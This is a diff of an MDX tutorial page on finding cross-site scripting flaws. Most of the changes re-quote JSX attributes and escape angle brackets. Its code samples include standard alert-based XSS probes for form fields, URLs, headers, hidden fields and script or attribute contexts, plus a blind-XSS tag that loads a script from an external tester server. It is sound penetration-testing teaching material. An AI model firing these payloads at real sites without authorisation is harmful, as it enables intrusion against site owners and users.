@@ -11,30 +11,30 @@ Discovering Cross-Site Scripting vulnerabilities requires a systematic approach 
 
 ## Manual Testing Approaches
 
-<Tabs defaultValue="input-fields" className="pt-5 pb-1">
+<Tabs defaultValue={"input-fields"} className={"pt-5 pb-1"}>
   <TabsList>
-    <TabsTrigger value="input-fields">Input Fields</TabsTrigger>
-    <TabsTrigger value="url-parameters">URL Parameters</TabsTrigger>
-    <TabsTrigger value="headers">HTTP Headers</TabsTrigger>
-    <TabsTrigger value="hidden-fields">Hidden Fields</TabsTrigger>
+    <TabsTrigger value={"input-fields"}>Input Fields</TabsTrigger>
+    <TabsTrigger value={"url-parameters"}>URL Parameters</TabsTrigger>
+    <TabsTrigger value={"headers"}>HTTP Headers</TabsTrigger>
+    <TabsTrigger value={"hidden-fields"}>Hidden Fields</TabsTrigger>
   </TabsList>
-  <TabsContent value="input-fields">
+  <TabsContent value={"input-fields"}>
     ### Testing Input Fields
     
     Form fields are common entry points for XSS attacks. Test each input field with various payloads:
     
-    1. Submit simple test strings like `<script>alert('XSS')</script>`
+    1. Submit simple test strings like `\<script\>alert('XSS')\</script\>`
     2. Check if the input is reflected in the response
     3. Observe how the application handles special characters
     4. Test different contexts (text fields, search boxes, comment forms)
     
     **Example Test Cases:**
-    - Text inputs: `<script>alert('XSS')</script>`
+    - Text inputs: `\<script\>alert('XSS')\</script\>`
     - Numeric fields: Try injecting strings instead of numbers
     - File uploads: Test filenames with XSS payloads
     - Rich text editors: Test if HTML filtering can be bypassed
   </TabsContent>
-  <TabsContent value="url-parameters">
+  <TabsContent value={"url-parameters"}>
     ### Testing URL Parameters
     
     URL parameters are prime targets for reflected XSS:
@@ -51,15 +51,15 @@ Discovering Cross-Site Scripting vulnerabilities requires a systematic approach 
     
     Try:
     ```
-    https://example.com/search?q=<script>alert('XSS')</script>
+    https://example.com/search?q=\<script\>alert('XSS')\</script\>
     ```
     
     Also test URL fragments (#) as they can trigger DOM-based XSS:
     ```
-    https://example.com/page#<script>alert('XSS')</script>
+    https://example.com/page#\<script\>alert('XSS')\</script\>
     ```
   </TabsContent>
-  <TabsContent value="headers">
+  <TabsContent value={"headers"}>
     ### Testing HTTP Headers
     
     Some applications reflect HTTP header values in the response:
@@ -70,12 +70,12 @@ Discovering Cross-Site Scripting vulnerabilities requires a systematic approach 
     
     **Example with Burp Suite:**
     ```
-    User-Agent: <script>alert('XSS')</script>
-    Referer: <script>alert('XSS')</script>
-    Cookie: <script>alert('XSS')</script>
+    User-Agent: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+Referer: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+Cookie: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
     ```
   </TabsContent>
-  <TabsContent value="hidden-fields">
+  <TabsContent value={"hidden-fields"}>
     ### Testing Hidden Fields
     
     Hidden form fields can be vulnerable to XSS:
@@ -86,13 +86,13 @@ Discovering Cross-Site Scripting vulnerabilities requires a systematic approach 
     
     **Example:**
     ```html
-    <input type="hidden" name="referrer" value="homepage">
-    ```
+\<input type="hidden" name="referrer" value="homepage"\>
+```
     
     Change to:
     ```html
-    <input type="hidden" name="referrer" value="<script>alert('XSS')</script>">
-    ```
+\<input type="hidden" name="referrer" value="\<script\>alert('XSS')\</script\>"\>
+```
   </TabsContent>
 </Tabs>
 
@@ -153,9 +153,9 @@ When input is reflected directly in HTML body:
 
 **Test payloads:**
 ```
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
+\<script\>alert('XSS')\</script\>
+\<img src="x" onerror="alert('XSS')"\>
+\<svg onload="alert('XSS')"\>
 ```
 
 ### JavaScript Context Testing
@@ -173,7 +173,7 @@ When input is reflected inside JavaScript:
 ```
 ';alert('XSS');//
 \';alert('XSS');//
-</script><script>alert('XSS')</script>
+\</script\>\<script\>alert('XSS')\</script\>
 ```
 
 ### Attribute Context Testing
@@ -181,7 +181,7 @@ When input is reflected inside JavaScript:
 When input is reflected inside HTML attributes:
 
 ```html
-<input type="text" value="USER_INPUT">
+\<input type="text" value="USER_INPUT"\>
 ```
 
 **Test payloads:**
@@ -191,7 +191,7 @@ When input is reflected inside HTML attributes:
 " onerror="alert('XSS')" src="x
 ```
 
-<Callout type="info" title="Context Matters">
+<Callout type={"info"} title={"Context Matters"}>
   Always identify the context where your input is being reflected before crafting payloads. A payload that works in one context may fail in another. Understanding the context is crucial for successful XSS exploitation.
 </Callout>
 
@@ -229,7 +229,7 @@ Follow this systematic approach to thoroughly test for XSS vulnerabilities:
    - Document the vulnerability
    - Test impact and exploitability
 
-<Callout type="warning" title="False Positives">
+<Callout type={"warning"} title={"False Positives"}>
   Be aware that automated tools often report false positives. Always manually verify reported XSS vulnerabilities before reporting them.
 </Callout>
 
@@ -260,7 +260,7 @@ Some XSS vulnerabilities only manifest in areas you can't directly see:
 3. Test admin panels, logs, and other areas where input might be viewed by others
 
 ```html
-<script src="https://yourserver.com/xss.js"></script>
+\<script src="https://yourserver.com/xss.js"\>\</script\>
 ```
 
 In the next section, we'll explore exploitation strategies for confirmed XSS vulnerabilities.
